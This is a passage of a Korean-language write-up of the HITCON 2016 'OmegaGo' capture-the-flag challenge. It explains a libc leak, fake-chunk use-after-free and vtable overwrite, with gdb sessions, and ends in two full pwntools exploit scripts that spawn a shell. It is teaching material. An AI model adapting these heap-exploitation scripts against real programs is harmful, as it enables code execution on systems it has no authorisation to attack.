* **다음과 같은 방법으로 Unsorted chunk의 fd, bk영역에 저장된 main\_arena.top의 주소 값 출력 할 수있습니다.**
  + "regret" 기능을 호출하면 gHistory[] 배열의 마지막에 저장된 2개의 Heap 영역이 해제됩니다.
    - 앞에서 설명했듯이 HUMAN GameInfo(0x1c88ef0) 영역이 Unsorted chunk됩니다.
    - Unsorted chunk(0x1c88ee0)의 fd, bk 영역에 main\_arena.top의 주소 값이 저장됩니다.  
      * fd(0x1c88ef0) : 0x7f4b7d233b78
      * bk(0x1c88ef8) : 0x7f4b7d233b78
  + regret() 함수는 gHistory[365]에 저장된 주소(0x1c88eb0)를 이용해 GameInfo를 gPlayerGameInfo 전역 변수에 저장합니다.  
    - 즉, Unsorted chunk(0x1c88ee0)의 fd, bk 영역이 출력됩니다.
    - 해당 값을 앞에서 작성한 Decode() 함수를 이용해 해석 할 수 있습니다.

```sh title="Get libc address."
gdb-peda$ c
Continuing.
Breakpoint 1, 0x00000000004015ce in ?? ()
gdb-peda$ c
Continuing.

Breakpoint 1, 0x00000000004015ce in ?? ()
gdb-peda$ ni
gdb-peda$ x/4gx 0x1c88ef0 - 0x10
0x1c88ee0:	0x33bb5de964b6f848	0x0000000000000091
0x1c88ef0:	0x00007f4b7d233b78	0x00007f4b7d233b78
gdb-peda$ p/x 0x1c88ef0 - 0x1c88eb0
$2 = 0x40
gdb-peda$ c
Continuing.
^C
Program received signal SIGINT, Interrupt.
0x00007f4b7cf66230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ x/12gx 0x609FC0
0x609fc0:	0x0000000000000000	0x0000000000000031
0x609fd0:	0x0000000001c88f70	0x0000000001c83880
0x609fe0:	0x0000000000000000	0x0000000000000000
0x609ff0:	0x33bb5de964b6f848	0x0000000000000091
0x60a000:	0x00007f4b7d233b78	0x00007f4b7d233b78
0x60a010:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **다음 코드를 이용할 수 있습니다.**

```python title="Get libc address"
from pwn import *
 
#context.log_level = 'debug'
 
col_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S']
 
p = process('omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac')

def Play(location):
    p.recvuntil('\n\n')
    p.sendline(location)
 
 
def readBoard():
    global board
    board = []
    p.recvline()
    for line in range(0,19):
    	p.recv(3)
        board.append(p.recvuntil('\n')[0:19])
 
def surrender():
    p.recvuntil('\n\n')
    p.sendline('surrender')
    p.recvuntil('Play history? (y/n)')
    p.sendline('n')
    p.recvuntil('Play again? (y/n)')
    p.sendline('y')
 
def Fill(colStart, colEnd, row):
    for colNum in range(col_list.index(colStart),col_list.index(colEnd)+1):
    	locate = str(col_list[colNum])
        locate += str(row)
        Play(locate)
 
def decode(offset):
    bit_offset = offset * 8
    data = ''.join(board)
    result = 0
    for i in xrange(32):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result
 
def LeakAddresss():
    readBoard()
    return decode(0)
 
def LeakLibcAddresss():
    readBoard()
    return decode(32)
  
#Memory reconstruction   
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
Fill('A','K',12)

#Leak LibcAddresss
p.recvuntil('\n\n')
p.sendline('D19')
p.recvuntil('\n\n')
p.sendline('regret')

libcAddresss = LeakLibcAddresss()
libcBaseAddresss = libcAddresss - 0x3c4b78
execve_bash = libcBaseAddresss + 0xF1117 

log.info('Libc Addresss : ' + hex(libcAddresss))
log.info('Libc Base Addresss : ' + hex(libcBaseAddresss))
log.info('execve bash Addresss : ' + hex(execve_bash))

p.interactive()
```

#### **Create a UAF vulnerability(Fake chunk)**

* **앞에서 설명한 취약성을 이용해 UAF 취약성을 만들 수 있습니다.**
  + 공격 대상은 AI Class의 vtable 입니다.
  + OmegaGo() 함수에서 AI Class의 vtable 공간으로 8 byte를 요청하고 있습니다.
    - 해당 Chunk의 크기는 0x20이 됩니다.
    - Chunk header(0x10) + Base heap area(0x10)
  + 즉, UAF취약성을 생성하기 위해서 0x20 byte의 fake chunk가 필요합니다.

```sh title="Find the vtable"
...
  AI = (Method *)operator new(8uLL);
  AI->Play = 0LL;
  setAIFunction(AI);
  player[0] = AI;
  HUMAN = (Method *)operator new(8uLL);
  HUMAN->Play = 0LL;
  setHUMANFunction(HUMAN);
...
```

* **다음과 같은 구조로 Fake chunk를 생성할 수 있습니다.**
  + 해당 바이너리의 취약성을 이용해 아래 조건을 만족하는 Fake chunk addresss를 gHistory[365]영역에 저장합니다.  
    - Fake chunk의 size가 0x20
    - Fake chunk의 next chunk(next\_size) 영역에 값이 있어야 함.

**Fake chunk struct**

|  | 0x0 | 0x8 |
| --- | --- | --- |
| 0x00 | 0000000000000000 | 0000000000000000 |
| 0x10 | 0000000000000000 | **0000000000000020** |
| 0x20 | 0000000000000000 | 0000010000000000 |
| 0x30 | 0000000000000000 | **0000000000000020** |
| 0x40 | 0000000000000000 | 0000000000000000 |
| 0x50 | 0000000000000000 | **next\_size** |
| 0x60 | 0000000900000009 | 000000000000004F |
| 0x70 | 40665799D0203E64 | 4066800000000000 |
| 0x80 | 0000000000000000 | 0000000000000031 |

* **아래 스크립트를 이용해 Fake chunk의 기본 모형을 만들수 있습니다.**

```python title="Create a Fake chunk"
...

#Memory reconstruction
surrender()
surrender()
surrender()
surrender()
surrender()
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)

#Fake Chunk
Play('D14')
Play('R8')

Fill('A','I',10)

p.interactive()
```

* **다음과 같이 Fake chunk를 확인 할 수 있습니다.**
  + 182번 위치 값을 입력해 gPlayerGameInfo 전역 변수에 Heap addresss(0xac6010)가 저장되었습니다.
  + Heap 영역에 Fakechunk가 구현 되어있습니다.

```sh title="Run script"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ python test.py 
[!] Could not find executable 'omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac' in $PATH, using './omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac' instead
[+] Starting local process './omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac': pid 7625
[*] Libc Addresss : 0x7ff0339f6b78
[*] Libc Base Addresss : 0x7ff033632000
[*] execve bash Addresss : 0x7ff0337186bd
[*] Switching to interactive mode
   ABCDEFGHIJKLMNOPQRS
19 ..O...XO.\x00XX.......
18 ...................
17 ...................
16 ...................
15 ...................
14 ...X...............
13 ...................
12 .O.................
11 XXXXXXXXXXXXXXXXXXX
10 XXXXXXXXXOOOOOOOOOO
 9 OOOOOOOOOOOOOOOOOOO
 8 .................X.
 7 ...................
 6 ...............O...
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 179.85

$
```

```sh title="Fake chunk"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ gdb -q -p 7625
Attaching to process 7625
Reading symbols from /home/lazenca0x0/CTF/HITCON/OmegaGo/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac...(no debugging symbols found)...done.
Reading symbols from /usr/lib/x86_64-linux-gnu/libstdc++.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libgcc_s.so.1...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.23.so...done.
done.
Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libm-2.23.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.23.so...done.
done.
0x00007f25b8a7d230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.

gdb-peda$ x/4gx 0x609FC0
0x609fc0:	0x0000000000ac6010	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000020
gdb-peda$ x/20gx 0x0000000000ac6010
0xac6010:	0x0000000000000000	0x0000000000000000
0xac6020:	0x0000000000000000	0x0000000000000020
0xac6030:	0xaaaa000000001000	0x555555aaaaaaaaaa
0xac6040:	0x0000000155555555	0x0000000000000020
0xac6050:	0x0000000000001000	0x0000000000000000
0xac6060:	0x0000000000000000	0x0000000000000000
0xac6070:	0x0000000a00000009	0x500001000000004f
0xac6080:	0x40667febca5375c7	0x40667b29ac365450
0xac6090:	0x0000000000000000	0x000000000000df71
0xac60a0:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.
```

* **다음과 같이 gPlayerGameInfo 전역 변수에 저장된 Heap addresss(0xac6010)를 변경되었습니다.**
  + 위치 값으로 변경 가능한 Heap addresss의 bit 영역은 다음과 같습니다.
    - 1010 1100 0110 0000 0001 0000
  + 다음과 같이 값을 변경합니다.
    - 1010 1100 0110 0010 1001 0000
    - 위치 값 : D19, E19
  + 사용자가 입력한 값 D19, E19에 의해 gPlayerGameInfo.board[0]에 저장된 값이 0xac6290 으로 변경되었습니다.
    - 0xac6290 영역은 GameInfo.board[9] 영역입니다.

```sh title="Position value"
$ D19
   ABCDEFGHIJKLMNOPQRS
19 ..OX..OX.XXX.......

...

Time remain: O: 180.00, X: 154.17

$ E19
   ABCDEFGHIJKLMNOPQRS
19 ..OXX.OX.XXX.......

...
Time remain: O: 180.00, X: 151.96

$
```

```sh title="The value of "gPlayerGameInfo.board[0]" has been changed."
^C
Program received signal SIGINT, Interrupt.
0x00007f25b8a7d230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ x/4gx 0x609FC0
0x609fc0:	0x0000000000ac6290	0x0000000000ac60d0
0x609fd0:	0x0000000000ac6190	0x0000000000ac6250
gdb-peda$ x/20gx 0x0000000000ac6290 - 0x10
0xac6280:	0x0000000155555555	0x0000000000000020
0xac6290:	0x0000000000001000	0x0000000000000000
0xac62a0:	0x0000000000000000	0x0000000000000400
0xac62b0:	0x0000000400000000	0x5000010000000058
0xac62c0:	0x40667febb1290256	0x4060b9413db7f173
0xac62d0:	0xb02c3b6be73a708c	0x0000000000000031
0xac62e0:	0xc6d1f75f00000000	0x0000000000abbc90
0xac62f0:	0x0000000000000000	0x0000000000000000
0xac6300:	0x6c0eb26d35c354ca	0x0000000000000091
0xac6310:	0x0000000000ac6290	0x0000000000ac60d0
gdb-peda$
```

* **다음과 같이 Fake chunk에 AI의 vtable공간이 할당됩니다.**
  + UAF를 확인하기 위해 다음과 같이 Break point를 설정합니다.

```sh title="Set Breakpoint"
gdb-peda$ b *0x401761
Breakpoint 1 at 0x401761
gdb-peda$ c
Continuing.
```

* **"surrender" 를 입력하고 게임을 재시작하면 다음과 같이 Heap 영역이 변경됩니다.**
  + 변경된 heap addresss에 의해 Fake chunk는 fastbins에 추가 되었습니다.
  + AI의 vtable을 저장 할 Heap 영역을 요청하면 fastbins에 등록되었던 Fake chunk(0xac6290)가 할당됩니다.
  + 이로 인해 AI vtable(0xac6290) 영역에 board[]의 정보를 덮어쓸 수 있습니다.

```sh title="After "surrender" and restart, the Heap area has been changed."
$ surrender
This AI is too strong, ah?
Play history? (y/n)
$ n
Play again? (y/n)
$ y
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 180.00

$
```

```sh title="UAF(AI vtable)" 
Breakpoint 1, 0x0000000000401761 in ?? ()
gdb-peda$ p main_arena.fastbinsY 
$1 = {0xac6280, 0xab8a40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ ni
0x0000000000401766 in ?? ()
gdb-peda$ i r rax
rax            0xac6290	0xac6290
gdb-peda$ p main_arena.fastbinsY 
$2 = {0x0, 0xab8a40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ x/4gx 0xac6290
0xac6290:	0x0000000000000000	0x0000000000000000
0xac62a0:	0x0000000000000000	0x0000000000000400
gdb-peda$ c
Continuing.
^C
Program received signal SIGINT, Interrupt.
0x00007ff033729230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ x/4gx 0xac6290
0xac6290:	0x0000000000405040	0x0000000000000000
0xac62a0:	0x0000000000000000	0x0000000000000400
gdb-peda$ x/gx 0x0000000000405040
0x405040:	0x000000000040290a
gdb-peda$ x/10i 0x000000000040290a
   0x40290a:	push   rbp
   0x40290b:	mov    rbp,rsp
   0x40290e:	sub    rsp,0x150
   0x402915:	mov    QWORD PTR [rbp-0x128],rdi
   0x40291c:	mov    QWORD PTR [rbp-0x130],rsi
   0x402923:	mov    DWORD PTR [rbp-0x134],edx
   0x402929:	mov    QWORD PTR [rbp-0x140],rcx
   0x402930:	mov    QWORD PTR [rbp-0x148],r8
   0x402937:	mov    rax,QWORD PTR fs:0x28
   0x402940:	mov    QWORD PTR [rbp-0x8],rax
gdb-peda$
```

* **다음과 같이 스크립트에 코드를 추가합니다.**

```python title="Add script code"
#0xXXXX010 -> 0xxxxx290
Play('D19')
Play('E19')

surrender()
```

#### **Overwrite the vtable**

* **다음과 같이 AI vtable을 덮어쓸 수 있습니다.**
  + AI vtable영역에서 호출 할 함수의 주소가 저장된 영역의 주소가 저장된 곳은 GameInfo.board[9] 으로 덮어쓰여 집니다.
  + 해당 영역에 저장 할 주소는 gCmd 전역 변수 + 4(0x60943C + 0x4 = 0x609440) 입니다.
* **해당 정보를 이용해 다음과 같은 위치 값을 생성할 수 있습니다.**
  + 위치 값 : D14, E14, G14, R15, A5, Q6
  + GameInfo.board[9] 영역에 0x609440이 저장되었습니다.

```sh title="Overwrite the vtable"
Q6
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 .................XO
14 ..OXX.X............
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ............O.OOX..
 5 XO.................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 162.59

gdb-peda$ x/20gx 0x609FC0
0x609fc0:	0x0000000000000000	0x0000000000000000
0x609fd0:	0x1800000000000000	0x00000000000008a4
0x609fe0:	0x0000000000000000	0x0000010000000000
0x609ff0:	0x0000000000000000	0x0000000000000000
0x60a000:	0x0000000000609440	0x0000000000000000
0x60a010:	0x0000000000000000	0x0000000000000000
0x60a020:	0x0000000200000005	0x000000000000004f
0x60a030:	0x40667fffaa044ae6	0x406452c1871e6cd3
0x60a040:	0x0000000000000000	0x0000000000000000
0x60a050:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **다음과 같이 스크립트에 코드를 추가합니다.**

```python title="Overwrite the vtable"
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)

#vtable Overflow
Play('D14')
Play('E14')
Play('G14')
Play('R15')
Play('A5')
Play('Q6')

Fill('A','E',19) 
sleep(20)
Play('F19|'+p64(execve_bash))
```

* **다음과 같이 변경된 vtable 정보를 확인 할 수 있습니다.**
  + AI vtable 영역은 0x1a37290 이며, 해당 영역에 gCmd 전역 변수(+4)의 주소가 저장되어 있습니다.
  + gCmd 전역 변수 +4(0x609440) 영역에는 One gadget의 주소 값이 저장되어 있습니다.
  + 해당 주소는 rax에 저장되어 호출되며, shell을 획득하게 됩니다.

```sh title="Get shell!"
lazenca0x0@ubuntu:~$ gdb -q -p 59695
Attaching to process 59695
Reading symbols from /home/lazenca0x0/CTF/HITCON/OmegaGo/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac...(no debugging symbols found)...done.
Reading symbols from /usr/lib/x86_64-linux-gnu/libstdc++.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libgcc_s.so.1...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.23.so...done.
done.
Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libm-2.23.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.23.so...done.
done.

gdb-peda$ b *0x4017D0
Breakpoint 1 at 0x4017d0
gdb-peda$ c
Continuing.

Breakpoint 1, 0x00000000004017d0 in ?? ()
gdb-peda$ x/13i $rip
=> 0x4017d0:	mov    rax,QWORD PTR [rbp+rax*8-0x30]
   0x4017d5:	mov    rax,QWORD PTR [rax]
   0x4017d8:	mov    rax,QWORD PTR [rax]
   0x4017db:	mov    edx,DWORD PTR [rbp-0x5c]
   0x4017de:	sub    edx,0x1
   0x4017e1:	movsxd rdx,edx
   0x4017e4:	mov    rdi,QWORD PTR [rbp+rdx*8-0x30]
   0x4017e9:	lea    rsi,[rbp-0x60]
   0x4017ed:	lea    rcx,[rbp-0x64]
   0x4017f1:	mov    edx,DWORD PTR [rbp-0x5c]
   0x4017f4:	mov    r8,rsi
   0x4017f7:	mov    esi,0x609fc0
   0x4017fc:	call   rax
gdb-peda$ i r rax
rax            0x0	0x0
gdb-peda$ i r rbp
rbp            0x7ffdb99059e0	0x7ffdb99059e0
gdb-peda$ p/x 0x7ffdb99059e0 - 0x30
$1 = 0x7ffdb99059b0
gdb-peda$ x/gx 0x7ffdb99059b0
0x7ffdb99059b0:	0x0000000001a37290
gdb-peda$ x/gx 0x0000000001a37290
0x1a37290:	0x0000000000609440
gdb-peda$ x/gx 0x0000000000609440
0x609440:	0x00007f10d2973117
gdb-peda$ x/5i 0x00007f10d2973117
   0x7f10d2973117 <exec_comm+2263>:	mov    rax,QWORD PTR [rip+0x2d2d9a]        # 0x7f10d2c45eb8
   0x7f10d297311e <exec_comm+2270>:	lea    rsi,[rsp+0x70]
   0x7f10d2973123 <exec_comm+2275>:	lea    rdi,[rip+0x9bbed]        # 0x7f10d2a0ed17
   0x7f10d297312a <exec_comm+2282>:	mov    rdx,QWORD PTR [rax]
   0x7f10d297312d <exec_comm+2285>:	call   0x7f10d294e770 <execve>
gdb-peda$ b *0x4017fc
Breakpoint 2 at 0x4017fc
gdb-peda$ c
Continuing.

Breakpoint 2, 0x00000000004017fc in ?? ()
gdb-peda$ i r rax
rax            0x7f10d2973117	0x7f10d2973117
gdb-peda$ c
Continuing.
process 59695 is executing new program: /bin/dash
```

## **Exploit Code**

### Ubuntu 16.04.3 LTS

```python title="Exploit(Ubuntu 16.04.3 LTS).py"
from pwn import *
 
#context.log_level = 'debug'
 
col_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S']
 
p = process('omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac')

def Play(location):
    p.recvuntil('\n\n')
    p.sendline(location)
 
 
def readBoard():
    global board
    board = []
    p.recvline()
    for line in range(0,19):
    	p.recv(3)
        board.append(p.recvuntil('\n')[0:19])
 
def surrender():
    p.recvuntil('\n\n')
    p.sendline('surrender')
    p.recvuntil('Play history? (y/n)')
    p.sendline('n')
    p.recvuntil('Play again? (y/n)')
    p.sendline('y')
 
def Fill(colStart, colEnd, row):
    for colNum in range(col_list.index(colStart),col_list.index(colEnd)+1):
    	locate = str(col_list[colNum])
        locate += str(row)
        Play(locate)
 
def decode(offset):
    bit_offset = offset * 8
    data = ''.join(board)
    result = 0
    for i in xrange(32):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result
 
def LeakAddresss():
    readBoard()
    return decode(0)
 
def LeakLibcAddresss():
    readBoard()
    return decode(32)
  
#Memory reconstruction   
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
Fill('A','K',12)

#Leak LibcAddresss
p.recvuntil('\n\n')
p.sendline('D19')
p.recvuntil('\n\n')
p.sendline('regret')

libcAddresss = LeakLibcAddresss()
libcBaseAddresss = libcAddresss - 0x3c4b78
execve_bash = libcBaseAddresss + 0xF1117 

log.info('Libc Addresss : ' + hex(libcAddresss))
log.info('Libc Base Addresss : ' + hex(libcBaseAddresss))
log.info('execve bash Addresss : ' + hex(execve_bash))

#Memory reconstruction
surrender()
surrender()
surrender()
surrender()
surrender()
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)

#Fake Chunk
Play('D14')
Play('R8')

Fill('A','I',10)

#0xXXXX010 -> 0xxxxx290
Play('D19')
Play('E19')

#UAF
surrender()

#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)

#vtable Overflow
Play('D14')
Play('E14')
Play('G14')
Play('R15')
Play('A5')
Play('Q6')

Fill('A','E',19) 
Play('F19|'+p64(execve_bash))
 
p.interactive()
```

### CTF server

```python title="Exploit(CTF server).py"
from pwn import *
 
#context.log_level = 'debug'
 
col_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S']
 
p = process('omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac')
 
def Play(location):
    p.recvuntil('\n\n')
    p.sendline(location)
 
 
def readBoard():
    global board
    board = []
    p.recvline()
    for line in range(0,19):
    	p.recv(3)
        board.append(p.recvuntil('\n')[0:19])
 
def surrender():
    p.recvuntil('\n\n')
    p.sendline('surrender')
    p.recvuntil('Play history? (y/n)')
    p.sendline('n')
    p.recvuntil('Play again? (y/n)')
    p.sendline('y')
 
def Fill(colStart, colEnd, row):
    for colNum in range(col_list.index(colStart),col_list.index(colEnd)+1):
    	locate = str(col_list[colNum])
        locate += str(row)
        Play(locate)
 
def decode(offset):
    bit_offset = offset * 8
    data = ''.join(board)
    result = 0
    for i in xrange(32):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result
 
def LeakAddresss():
    readBoard()
    return decode(0)
 
def LeakLibcAddresss():
    readBoard()
    return decode(32)
  
#Memory reconstruction   
surrender()
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
Fill('A','K',12)
 
#Leak LibcAddresss
p.recvuntil('\n\n')
p.sendline('D19')
p.recvuntil('\n\n')
p.sendline('regret')

libcAddresss = LeakLibcAddresss()
libcBaseAddresss = libcAddresss - 0x3be7b8
execve_bash = libcBaseAddresss + 0xe66bd
 
log.info('Libc Addresss : ' + hex(libcAddresss))
log.info('Libc Base Addresss : ' + hex(libcBaseAddresss))
log.info('execve bash Addresss : ' + hex(execve_bash))

#Memory reconstruction
surrender()
surrender()
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
 
#Fake Chunk
Play('D14')
Play('R8')
 
#0xXXXX410 -> 0xxxxx550
Fill('A','I',10)
Play('P1')
Play('O1')

surrender()

#Fill out to board 
Fill('B','S',6)
for line in range(15,20):
    Fill('A','S',line)
Play('A6')
 
#vtable Overflow
Play('B7')
Play('S8')
Play('R8')
Play('C12')
Play('F12')
Play('M8')
 
for line in range(16,19):
    Fill('A','S',line)
 
Fill('A','E',15)
sleep(20) 
Play('F15|'+p64(execve_bash))
 
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**

* <http://charo-it.hatenablog.jp/entry/2016/12/08/085226>
* <https://github.com/pwning/public-writeup/tree/master/hitcon2016/pwn350-omegago>